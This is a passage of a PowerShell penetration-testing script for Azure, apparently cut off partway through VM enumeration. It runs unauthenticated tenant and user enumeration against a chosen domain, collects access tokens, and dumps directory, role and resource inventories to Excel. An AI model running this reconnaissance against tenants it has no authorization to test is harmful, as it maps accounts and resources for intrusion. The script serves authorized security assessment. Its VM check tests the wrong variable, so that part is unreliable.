# Azure Pentesting Tool - Full Script
# Global variables
$Global:AccessToken = $null
$Global:mgt_access_token = $null
$Global:graph_access_token = $null
$Global:UnauthenticatedDomain = $null

# Main Menu
function Show-MainMenu {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Azure Pentesting Tool - Main Menu " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "1. Unauthenticated Enumeration" -ForegroundColor Yellow
    Write-Host "2. Authenticated Enumeration" -ForegroundColor Yellow
    Write-Host "3. Check for Common Misconfigurations" -ForegroundColor Yellow
    Write-Host "4. Other Attacks" -ForegroundColor Yellow
    Write-Host "5. Graph Runner Tool - Loot" -ForegroundColor Yellow
    Write-Host "6. AzureHound Ingestor" -ForegroundColor Yellow
    Write-Host "7. Other Useful Commands" -ForegroundColor Yellow
    Write-Host "8. Install required tools" -ForegroundColor Yellow
    Write-Host "9. Exit" -ForegroundColor Yellow
    Write-Host "===================================" -ForegroundColor Cyan
    $choice = Read-Host "Enter your choice"
    Process-MainMenuChoice $choice
}


function Process-MainMenuChoice {
    param ([string]$choice)
    switch ($choice) {
        "1" { Initialize-UnauthenticatedDomain; Show-UnauthenticatedEnumerationMenu }
        "2" { Perform-AuthenticatedEnumeration }
        "3" { Authenticate-CommonMisconfigurations}
        "4" { Authenticate-OtherAttacks}
        "5" { Run-GraphRunnerLoot }
        "6" { Run-AzureHoundIngestor }
        "7" { Show-OtherCommandsMenu }
        "8" { Install-RequiredTools }
        "9" { Write-Host "Exiting... Thank you for using the tool!" -ForegroundColor Green; Exit }
        default { Write-Host "Invalid choice! Please select a valid option." -ForegroundColor Red; Start-Sleep -Seconds 2; Show-MainMenu }
    }
}

# Unauthenticated Enumeration
function Initialize-UnauthenticatedDomain {
    while ($true) {
        Write-Host "`n===================================" -ForegroundColor Cyan
        Write-Host " Domain Initialization for Unauthenticated Enumeration " -ForegroundColor Green
        Write-Host "===================================" -ForegroundColor Cyan
        
        $domain = Read-Host "Enter the domain name to use for this session (e.g., example.com)"

        # Validate domain format
        if ($domain -match '^(?!:\/\/)([a-zA-Z0-9-_]+\.)+[a-zA-Z]{2,}$') {
            # Detect OS and use the appropriate command
            if ($IsLinux) {
                # Linux: Use dig for DNS resolution
                try {
                    $result = bash -c "dig +short $domain" | Out-String
                    if (-not [string]::IsNullOrWhiteSpace($result)) {
                        Write-Host "Domain '$domain' is valid and resolved successfully (Linux)." -ForegroundColor Green
                        $Global:UnauthenticatedDomain = $domain
                        break
                    } else {
                        Write-Host "Domain '$domain' is invalid or does not resolve (Linux). Please try again." -ForegroundColor Red
                    }
                } catch {
                    Write-Host "Error resolving domain '$domain' using dig on Linux. Please check your input." -ForegroundColor Red
                }
            } elseif ($IsWindows) {
                # Windows: Use Resolve-DnsName for DNS resolution
                try {
                    [void](Resolve-DnsName -Name $domain -ErrorAction Stop)
                    Write-Host "Domain '$domain' is valid and resolved successfully (Windows)." -ForegroundColor Green
                    $Global:UnauthenticatedDomain = $domain
                    break
                } catch {
                    Write-Host "Domain '$domain' is invalid or does not resolve (Windows). Please try again." -ForegroundColor Red
                }
            } else {
                Write-Host "Unsupported OS. Unable to validate domain." -ForegroundColor Red
                break
            }
        } else {
            Write-Host "Invalid domain format. Please ensure it's in a valid domain format (e.g., example.com)." -ForegroundColor Red
        }
    }
}


function Show-UnauthenticatedEnumerationMenu {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Unauthenticated Enumeration Menu " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "1. Check if Company Using Azure" -ForegroundColor Yellow
    Write-Host "2. Get Tenant ID" -ForegroundColor Yellow
    Write-Host "3. Get the List of verified Domain Names of the Tenant" -ForegroundColor Yellow
    Write-Host "4. Check if User is Valid" -ForegroundColor Yellow
    Write-Host "5. Check if the Organization is Using O365 Service" -ForegroundColor Yellow
    Write-Host "6. Check if Company Using Azure Entra ID as the Identity Platform" -ForegroundColor Yellow
    Write-Host "7. Basic Information Check" -ForegroundColor Yellow
    Write-Host "8. Go Back to Main Menu" -ForegroundColor Yellow
    Write-Host "===================================" -ForegroundColor Cyan
    $choice = Read-Host "Enter your choice"
    Process-UnauthenticatedEnumerationChoice $choice
}

function Process-UnauthenticatedEnumerationChoice {
    param ([string]$choice)
    switch ($choice) {
        "1" { Check-CompanyUsingAzure }
        "2" { Get-TenantInformation }
        "3" { Get-TenantDomainNames }
        "4" { Check-ValidUser }
        "5" { Check-O365Service }
        "6" { Check-AzureEntraID }
        "7" { Check-AllinOne }
        "8" { $Global:UnauthenticatedDomain = $null; Show-MainMenu }
        default { Write-Host "Invalid choice! Returning to Unauthenticated Enumeration Menu." -ForegroundColor Red; Start-Sleep -Seconds 2; Show-UnauthenticatedEnumerationMenu }
    }
}

# Function to check if the company uses Azure
function Check-CompanyUsingAzure {
     Write-Host "Checking if Company Using Azure..."
    try {
        $recon = Invoke-AADIntReconAsOutsider -Domain $Global:UnauthenticatedDomain
        $recon | Format-Table -AutoSize
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}

# Function to get tenant information
function Get-TenantInformation {
     Write-Host "Getting Tenant Information..."
    try {
        $tenantInfo = Get-AADIntTenantID -Domain $Global:UnauthenticatedDomain
        $tenantInfo | Format-Table -AutoSize
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}

# Function to get tenant domain names
function Get-TenantDomainNames {
    Write-Host "Getting the List of Domain Names of the Tenant..."
    try {
        $domains = Get-AADIntTenantDomains -Domain $Global:UnauthenticatedDomain
        $domains | Format-Table -AutoSize
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}

# Function to check if a user is valid
function Check-ValidUser {
    $username = Read-Host "Enter username (e.g., user@example.com)"
    Write-Host "Checking if User is Valid..."
    try {
        $userCheck = Invoke-AADIntUserEnumerationAsOutsider -UserName $username
        $userCheck | Format-Table -AutoSize
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}


# Function to check if organization uses O365
function Check-O365Service {
    $username = Read-Host "Enter username (e.g., user@example.com)"
    Write-Host "Checking if the Organization is Using O365 Service..."
    try {
        $o365Check = Invoke-RestMethod -Method GET -Uri "https://outlook.office365.com/autodiscover/autodiscover.json?Email=$username&Protocol=Autodiscoverv1" -ErrorAction Stop
        $o365Check | Format-Table -AutoSize
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}


# Function to check if company uses Azure Entra ID
function Check-AzureEntraID {
    Write-Host "Checking if Company Using Azure Entra ID..."
    try {
       # Invoke-RestMethod fetches structured data by default, so we use Invoke-WebRequest for raw content
	$response = Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=$Global:UnauthenticatedDomain&xml=1" -ErrorAction Stop

	# Use regex on the raw content
	$namespace = [regex]::Match($response.Content, '<NameSpaceType>(.*?)</NameSpaceType>').Groups[1].Value

        Write-Host "Namespace Type: $($namespace)"
        Write-Host "If Namespace is managed, company is using Azure Entra ID"
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
    Show-UnauthenticatedEnumerationMenu
}

#Fucntion for basic check
function Check-AllinOne {
    Write-Host "Gathering all the basic unauthenticated information..." -ForegroundColor Cyan
    try {
        # Query for tenant information via AutoDiscover
        $autodiscover = Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=user@$Global:UnauthenticatedDomain" -UseBasicParsing | ConvertFrom-Json

        # Azure tenant metadata endpoint
        $metadata = Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/v2.0/.well-known/openid-configuration" -UseBasicParsing | ConvertFrom-Json

             # Determine tenant brand
        $tenantBrand = if ($autodiscover.NameSpaceType -eq "Managed") { 
            "Microsoft Managed Tenant" 
        } else { 
            "Federated Tenant" 
        }

        # Determine if SSO is enabled
        $ssoStatus = if ($autodiscover.AuthURL) { 
            "Enabled" 
        } else { 
            "Disabled" 
        }

        # Determine if Certificate-based Auth (CBA) is available
        $cbaStatus = if ($metadata.certificate_based_authentication_supported) { 
            "Available" 
        } else { 
            "N/A" 
        }

        # Prepare a list of properties for display
        $results = @(
            [PSCustomObject]@{ Property = "Default Domain";              Value = $Global:UnauthenticatedDomain }
            [PSCustomObject]@{ Property = "Tenant Type";                Value = $autodiscover.NameSpaceType }
            [PSCustomObject]@{ Property = "Tenant Brand";               Value = $tenantBrand }
            [PSCustomObject]@{ Property = "SSO";                        Value = $ssoStatus }
            [PSCustomObject]@{ Property = "Certificate-based Auth (CBA)"; Value = $cbaStatus }
            [PSCustomObject]@{ Property = "Authentication URL";         Value = $autodiscover.AuthURL }
            [PSCustomObject]@{ Property = "Federation Metadata URL";    Value = $autodiscover.FederationMetadataURL }
            [PSCustomObject]@{ Property = "STS Authentication";         Value = $autodiscover.CloudInstanceName }
            [PSCustomObject]@{ Property = "Authorization Endpoint";     Value = $metadata.authorization_endpoint }
            [PSCustomObject]@{ Property = "Token Endpoint";             Value = $metadata.token_endpoint }
            [PSCustomObject]@{ Property = "Issuer";                     Value = $metadata.issuer }
        )

        # Display the results in a table
        $results | Format-Table -AutoSize

    } catch {
        Write-Host "An error occurred while fetching the tenant information: $_" -ForegroundColor Red
    }

# Display verified domains below the table
	Get-TenantDomainNames
	  	
	 Start-Sleep -Seconds 3
    # Go back to the main menu
    Show-UnauthenticatedEnumerationMenu
}

# Authenticated Enumeration
function Perform-AuthenticatedEnumeration {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Authenticated Enumeration " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan

    Authenticate-User
    Perform-AuthenticatedEnumeration
}

function Authenticate-User {
    Write-Host "`nChoose a Login Method:" -ForegroundColor Cyan
    Write-Host "1. Login with User Credentials" -ForegroundColor Yellow
    Write-Host "2. Login Using Device Code Login" -ForegroundColor Yellow
    Write-Host "3. Login with Service Principal" -ForegroundColor Yellow
    Write-Host "4. Go Back to Main Menu" -ForegroundColor Yellow
    $authChoice = Read-Host "Select a login method"

    switch ($authChoice) {
        "1" {
            Login-WithUser
        }
        "2" {
            Login-WithDeviceCode
        }
        "3"
        {
            Login-ServicePrincipal
        }
        "4"
        {
        Show-MainMenu
        }
        
        default {
            Write-Host "Invalid choice. Returning to main menu." -ForegroundColor Red
            Show-MainMenu
        }
    }
}

function Login-WithUser {
    Write-Host "`nLogin with User Credentials" -ForegroundColor Cyan

    # Ask for username and password
    $username = Read-Host "Enter your username (e.g., username@example.com)"
    $password = Read-Host "Enter your password" -AsSecureString

 while ($true) {
    try {
        # Convert password and create PSCredential object
        $passwd = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
        $creds = New-Object System.Management.Automation.PSCredential($username, $password)

        # Connect to Azure-this will not work if user does not have susbcription atached to the account
        Write-Host "Authenticating with Azure..." -ForegroundColor Green
        $null=Connect-AzAccount -Credential $creds -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Authentication successful!" -ForegroundColor Green

        # Retrieve Access Tokens
        Write-Host "Retrieving Management and Graph Access Tokens..."

        # Management Token
        $mgt_token_response = (Get-AzAccessToken -ResourceUrl "https://management.azure.com")
        $Global:mgt_access_token = $mgt_token_response.Token

        # Graph Token
        $graph_token_response = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com")
        $Global:graph_access_token = $graph_token_response.Token
        Write-Host "Connecting to Microsoft Graph..." -ForegroundColor Green
        $secureToken = ConvertTo-SecureString $Global:graph_access_token -AsPlainText -Force
        $null=Connect-MgGraph -AccessToken $securetoken -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Graph connection successful!" -ForegroundColor Green

        if ($Global:mgt_access_token -and $Global:graph_access_token) {
            Write-Host "Tokens retrieved and stored for this session:"
           
        } else {
            Write-Host "Failed to retrieve access tokens. Please verify your credentials." -ForegroundColor Red
            Exit
        }
        # Break out of the loop on successful authentication
            return Show-AuthenticatedEnumerationMenu
    } catch {
        Write-Host "Authentication failed. Error: $_" -ForegroundColor Red
            $choice = Read-Host "Do you want to try again? (y/n)"
            if ($choice -eq "y") {Authenticate-User}
            else {Show-MainMenu}
    
    }
    
    }
    
}


function Login-WithDeviceCode {
    Write-Host "`nLogin Using Device Code Authentication" -ForegroundColor Cyan

    try {
        # Authenticate using Device Code
        Write-Host "Please follow the instructions for device code authentication..." -ForegroundColor Yellow
        $null=Connect-AzAccount -UseDeviceAuthentication -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Authentication successful!" -ForegroundColor Green

        # Retrieve Management Token
        Write-Host "Retrieving Management Access Token..." -ForegroundColor Cyan
        $mgt_token_response = Get-AzAccessToken -ResourceUrl "https://management.azure.com"
        $Global:mgt_access_token = $mgt_token_response.Token

        # Retrieve Graph Token
        $graph_token_response = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com")
        $Global:graph_access_token = $graph_token_response.Token
        Write-Host "Connecting to Microsoft Graph..."
        $secureToken = ConvertTo-SecureString $Global:graph_access_token -AsPlainText -Force
        $null=Connect-MgGraph -AccessToken $securetoken -ErrorAction Stop
        Write-Host "Graph connection successful!" -ForegroundColor Green

        if ($Global:mgt_access_token -and $Global:graph_access_token) {
            Write-Host "Tokens retrieved and stored for this session:" -ForegroundColor Green
            Write-Host "Management Access Token stored in variable: `$Global:mgt_access_token" -ForegroundColor Yellow
            Write-Host "Graph Access Token stored in variable: `$Global:graph_access_token" -ForegroundColor Yellow
            } else {
            Write-Host "Failed to retrieve access tokens after authentication." -ForegroundColor Red
        }
        # Show the authenticated enumeration menu
        Show-AuthenticatedEnumerationMenu
        
    } catch {
        Write-Host "Device code authentication failed. Error: $_" -ForegroundColor Red
        # Return to the menu even after failure
        Show-AuthenticatedEnumerationMenu
         }
}


function Login-ServicePrincipal {

	 # Ask for Credentials
    	$clientID = Read-Host "Enter enter client ID:"
    	$ClientSecret = Read-Host "Enter enter client Secret:"
    	$tenantID = Read-Host "Enter enter TenantID:"
	Write-Host "Attempting to log in as Service Principal..."
	try {
        Connect-AzAccount -ServicePrincipal -TenantId $TenantId -Credential (New-Object System.Management.Automation.PSCredential($ClientId, (ConvertTo-SecureString $ClientSecret -AsPlainText -Force))) -ErrorAction Stop
        Write-Host "Service Principal login successful!" -ForegroundColor Green
        
        # Management Token
        $mgt_token_response = (Get-AzAccessToken -ResourceUrl "https://management.azure.com")
        $Global:mgt_access_token = $mgt_token_response.Token

        # Graph Token
        $graph_token_response = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com")
        $Global:graph_access_token = $graph_token_response.Token
        
    } catch {
        Write-Host "Failed to log in as Service Principal: $_" -ForegroundColor Red
        Show-MainMenu
    }

}

function Show-AuthenticatedEnumerationMenu {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Authenticated Enumeration Menu " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "1. List Azure AD Users (Auto)" -ForegroundColor Yellow
    Write-Host "2. List Azure AD Groups (Auto)" -ForegroundColor Yellow
    Write-Host "3. Enumerate Subscriptions (Auto)" -ForegroundColor Yellow
    Write-Host "4. Enumerate Resources" -ForegroundColor Yellow
    Write-Host "5. Enumerate Resource Groups" -ForegroundColor Yellow
    Write-Host "6. Enumerate App Services" -ForegroundColor Yellow
    Write-Host "7. Enumerate Permissions" -ForegroundColor Yellow
    Write-Host "8. Enumerate Key Vaults" -ForegroundColor Yellow
    Write-Host "9. Enumerate Storage Accounts" -ForegroundColor Yellow
    Write-Host "10. Enumerate SQL Servers" -ForegroundColor Yellow
    Write-Host "11. Check CosmosDB" -ForegroundColor Yellow
    Write-Host "12. Enumerate Virtual Machines" -ForegroundColor Yellow
    Write-Host "13. Enumerate Administrative Units" -ForegroundColor Yellow
    Write-Host "14. Authenticated All in One Basic Enumeration" -ForegroundColor Yellow
    Write-Host "15. Go Back to Main Menu" -ForegroundColor Yellow
    Write-Host "===================================" -ForegroundColor Cyan
    $choice = Read-Host "Enter your choice"
    Process-AuthenticatedEnumerationChoice $choice
}

function Process-AuthenticatedEnumerationChoice {
    param ([string]$choice)
    switch ($choice) {
        "1" { List-AzureADUsers }
        "2" { List-AzureADGroups }
        "3" { Enumerate-Subscriptions }
        "4" { Enumerate-Resources }
        "5" { Enumerate-ResourceGroups }
        "6" { Enumerate-AppServices }
        "7" { Enumerate-Permissions }
        "8" { Enumerate-KeyVaults }
        "9" { Enumerate-StorageAccounts }
        "10" { Enumerate-SQLServers }
        "11" { Check-CosmosDB }
        "12" { Enumerate-VirtualMachines }
        "13" { Enumerate-Administrativeunits }
        "14" { Enumerate-AuthAllinOne }
        "15" { Show-MainMenu }
        default {
            Write-Host "Invalid choice! Returning to Authenticated Enumeration Menu." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Show-AuthenticatedEnumerationMenu
        }
    }
}

## Enumerate Azure AD Users and save to Excel
function List-AzureADUsers {
    Write-Host "Listing Azure AD Users and saving results to an Excel file..."
    try {
        # Fetch users
        $users = Get-AzADUser

        # Display top 20 users
        Write-Host "Top 20 Users:" -ForegroundColor Cyan
        $users | Select-Object DisplayName, UserPrincipalName, Id -First 20 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_AD_Users.xlsx"
        $users | Export-Excel -Path $filePath -WorksheetName "Users" -AutoSize -WarningAction SilentlyContinue
        
        Write-Host "User is also a memeber of:" -ForegroundColor Cyan
	$groups=Get-MgUserMemberOf -UserId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id
	$Groups | ForEach-Object {
	    if ($_.AdditionalProperties["displayName"]) {
	        $_.AdditionalProperties["displayName"]
	    } else {
        Write-Output "No DisplayName for Group ID: $($_.Id)"
        }
        }
        Write-Host "Full user data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to list Azure AD users or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu 
}

# Enumerate Azure AD Groups and save to Excel
function List-AzureADGroups {
    Write-Host "Listing Azure AD Groups and saving results to an Excel file..."
    try {
        # Fetch groups
        $groups = Get-AzADGroup

        # Display top 20 groups
        Write-Host "Top 20 Groups:" -ForegroundColor Cyan
        $groups | Select-Object DisplayName, Mail, Id -First 20 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_AD_Groups.xlsx"
        $groups | Export-Excel -Path $filePath -WorksheetName "Groups" -AutoSize -WarningAction SilentlyContinue

        Write-Host "Full group data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to list Azure AD groups or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Subscriptions and save to Excel
function Enumerate-Subscriptions {
    Write-Host "Enumerating Subscriptions and saving results to an Excel file..."
    try {
        # Fetch subscriptions
        $subscriptions = Get-AzSubscription
        
        # Check if there are any subscriptions
        if ($subscriptions.Count -eq 0) {
            Write-Host "No subscriptions found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }


        # Display top 10 subscriptions
        Write-Host "Top 10 Subscriptions:" -ForegroundColor Cyan
        $subscriptions | Select-Object Name, SubscriptionId, State -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_Subscriptions.xlsx"
        $subscriptions | Export-Excel -Path $filePath -WorksheetName "Subscriptions" -AutoSize

        Write-Host "Full subscription data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate subscriptions or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Resources and save to Excel
function Enumerate-Resources {
    Write-Host "Enumerating Resources and saving results to an Excel file..."
    try {
        # Fetch resources
        $resources = Get-AzResource
        
         # Check if there are any resources
        if ($resources.Count -eq 0) {
            Write-Host "No resources found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }

        # Display top 20 resources
        Write-Host "Top 20 Resources:" -ForegroundColor Cyan
        $resources | Select-Object Name, ResourceType, ResourceGroupName -First 20 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_Resources.xlsx"
        $resources | Export-Excel -Path $filePath -WorksheetName "Resources" -AutoSize

        Write-Host "Full resource data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate resources or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Resource Groups and save to Excel
function Enumerate-ResourceGroups {
    Write-Host "Enumerating Resource Groups and saving results to an Excel file..."
    try {
        # Fetch resource groups
        $resourceGroups = Get-AzResourceGroup
        
          # Check if there are any resource group
        if ($resourceGroups.Count -eq 0) {
            Write-Host "No resource group found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }
        

        # Display top 10 resource groups
        Write-Host "Top 10 Resource Groups:" -ForegroundColor Cyan
        $resourceGroups | Select-Object ResourceGroupName, Location, ProvisioningState -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_ResourceGroups.xlsx"
        $resourceGroups | Export-Excel -Path $filePath -WorksheetName "ResourceGroups" -AutoSize

        Write-Host "Full resource group data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate resource groups or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate App Services and save to Excel
function Enumerate-AppServices {
    Write-Host "Enumerating App Services and saving results to an Excel file..."
    try {
        # Fetch app services
        $appServices = Get-AzWebApp
        
          # Check if there are any subscriptions
        if ($appServices.Count -eq 0) {
            Write-Host "No resource group found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }

        # Display top 10 app services
        Write-Host "Top 10 App Services:" -ForegroundColor Cyan
        $appServices | Select-Object Name, ResourceGroup, State -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_AppServices.xlsx"
        $appServices | Export-Excel -Path $filePath -WorksheetName "AppServices" -AutoSize

        Write-Host "Full app service data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate app services or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}


# Enumerate Permissions
function Enumerate-Permissions {
    Write-Host "Enumerating Permissions and saving results to an Excel file..."
    try {
        # Fetch Permissions
        $RoleAssign = Get-AzRoleAssignment

        # Display top 10 permissions
        Write-Host "Top 10 Permissions Listed:" -ForegroundColor Cyan
        $RoleAssign | Select-Object DisplayName, SignInName, RoleDefinitionName,RoleAssignmentId  -First 10 | Format-Table -AutoSize
	
	#List Role Assignments for the Current User
         Write-Host "Check the current user permissions" -ForegroundColor Green
         Get-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id | Select-Object DisplayName, RoleDefinitionName, Scope
                  
         
        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_RoleAssignment.xlsx"
        $RoleAssign | Export-Excel -Path $filePath -WorksheetName "RoleAssigned" -AutoSize

        Write-Host "Full list has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate roles or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}


# Enumerate Key Vaults and save to Excel
function Enumerate-KeyVaults {
    Write-Host "Enumerating Key Vaults and saving results to an Excel file..."
    try {
        # Fetch key vaults
        $keyVaults = Get-AzKeyVault
        
          # Check if there are any keyvault
        if ($keyVaults.Count -eq 0) {
            Write-Host "No Key Vault found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }

        # Display top 10 key vaults
        Write-Host "Top 10 Key Vaults:" -ForegroundColor Cyan
        $keyVaults | Select-Object VaultName, ResourceGroupName, Location -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_KeyVaults.xlsx"
        $keyVaults | Export-Excel -Path $filePath -WorksheetName "KeyVaults" -AutoSize

        Write-Host "Full key vault data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate key vaults or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Storage Accounts and save to Excel
function Enumerate-StorageAccounts {
    Write-Host "Enumerating Storage Accounts and saving results to an Excel file..."
    try {
        # Fetch storage accounts
        $storageAccounts = Get-AzStorageAccount
	if ($storageAccounts.Count -eq 0) {
            Write-Host "No storage account found for the authenticated user." -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
        }
	
        # Display top 10 storage accounts
        Write-Host "Top 10 Storage Accounts:" -ForegroundColor Cyan
        $storageAccounts | Select-Object StorageAccountName, ResourceGroupName, Location -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_StorageAccounts.xlsx"
        $storageAccounts | Export-Excel -Path $filePath -WorksheetName "StorageAccounts" -AutoSize

        Write-Host "Full storage account data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate storage accounts or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate SQL Servers and save to Excel
function Enumerate-SQLServers {
    Write-Host "Enumerating SQL Servers and saving results to an Excel file..."
    try {
        # Fetch SQL servers
        $sqlServers = Get-AzSqlServer

        # Display top 10 SQL servers
        Write-Host "Top 10 SQL Servers:" -ForegroundColor Cyan
        $sqlServers | Select-Object ServerName, ResourceGroupName, Location -First 10 | Format-Table -AutoSize
	#Check for DB in SQL SErvers
	if ($sqlServers.Count -gt 0) {
    foreach ($SQLServer in $SQLServers) {
        Get-AzSqlDatabase -ServerName $SQLServer.ServerName -ResourceGroupName $SQLServer.ResourceGroupName
    }
}

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_SQLServers.xlsx"
        $sqlServers | Export-Excel -Path $filePath -WorksheetName "SQLServers" -AutoSize

        Write-Host "Full SQL server data has been saved to Excel file: $filePath" -ForegroundColor Green
        
    } catch {
        Write-Host "Failed to enumerate SQL servers or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

 #Check CosmosDB and save to Excel
function Check-CosmosDB {
    Write-Host "Checking CosmosDB Accounts and saving results to an Excel file..." -ForegroundColor Yellow

    try {
        # Enumerate all resource groups
        Write-Host "Fetching all resource groups..." -ForegroundColor Cyan
        $ResourceGroups = (Get-AzResourceGroup).ResourceGroupName

        if (-not $ResourceGroups) {
            Write-Host "No resource groups found in the subscription." -ForegroundColor Red
            Show-AuthenticatedEnumerationMenu 
        }

        # Initialize an array to store all CosmosDB accounts
        $allCosmosDBAccounts = @()

        # Iterate through each resource group and fetch CosmosDB accounts
        foreach ($ResourceGroup in $ResourceGroups) {
            Write-Host "Checking CosmosDB accounts in Resource Group: $ResourceGroup" -ForegroundColor Green
            $cosmosDBAccounts = Get-AzCosmosDBAccount -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue

            if ($cosmosDBAccounts) {
                $allCosmosDBAccounts += $cosmosDBAccounts
            } else {
                Write-Host "No CosmosDB accounts found in Resource Group: $ResourceGroup" -ForegroundColor Yellow
            }
        }

        # Check if any CosmosDB accounts were found
        if (-not $allCosmosDBAccounts) {
            Write-Host "No CosmosDB accounts found in any resource group." -ForegroundColor Red
            
        }

        # Display the top 10 CosmosDB accounts
        Write-Host "Top 10 CosmosDB Accounts:" -ForegroundColor Cyan
        $allCosmosDBAccounts | Select-Object Name, ResourceGroupName, Location -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_CosmosDBAccounts.xlsx"
        $allCosmosDBAccounts | Export-Excel -Path $filePath -WorksheetName "CosmosDB" -AutoSize

        Write-Host "Full CosmosDB data has been saved to Excel file: $filePath" -ForegroundColor Green
        Show-AuthenticatedEnumerationMenu 
    } catch {
        Write-Host "Failed to check CosmosDB accounts. Ensure you are authenticated and have permissions." -ForegroundColor Red
        Show-AuthenticatedEnumerationMenu 
    }

    # Return to the authenticated enumeration menu
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Virtual Machines and save to Excel
function Enumerate-VirtualMachines {
    Write-Host "Enumerating Virtual Machines and saving results to an Excel file..."
    try {
        # Fetch virtual machines
        $vms = Get-AzVM
        
         # Check if there are any VM
        if ($keyVaults.Count -eq 0) {
            Write-Host "No virtual machines found" -ForegroundColor Yellow
            return  Show-AuthenticatedEnumerationMenu
	}
        # Display top 10 VMs
        Write-Host "Top 10 Virtual Machines:" -ForegroundColor Cyan
        $vms | Select-Object Name, ResourceGroupName, Location, ProvisioningState -First 10 | Format-Table -AutoSize

        # Save full data to Excel
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_VirtualMachines.xlsx"
        $vms | Export-Excel -Path $filePath -WorksheetName "VirtualMachines" -AutoSize

